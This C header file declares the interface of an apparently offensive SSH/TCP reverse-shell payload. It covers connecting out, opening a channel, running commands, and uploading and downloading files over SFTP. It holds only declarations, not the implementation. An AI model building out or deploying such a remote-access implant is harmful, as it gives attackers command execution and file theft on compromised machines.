//
// Created by rip on 7/1/19.
//

#ifndef SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_C_H
#define SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_C_H

#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "libssh/libssh.h"
#include "libssh/sftp.h"
#include "utils.h"

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
#include <direct.h>
#endif

#define MAX_BUFF_SIZE 50000
#define	S_IRWXU	0000700			/* RWX mask for owner */
#define	S_IRUSR	0000400			/* R for owner */
#define	S_IWUSR	0000200			/* W for owner */
#define	S_IXUSR	0000100			/* X for owner */

void setupSSH();
void doConnect();
void handleConnection();
void tearDown();
int openChannel();
void sendMsg(char*);
void rcvMsg(char*);
sftp_session setupSFTP();
void upload(char*, char*);
void download(char*, char*);
Array execCmd(char*);


#endif //SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_C_H
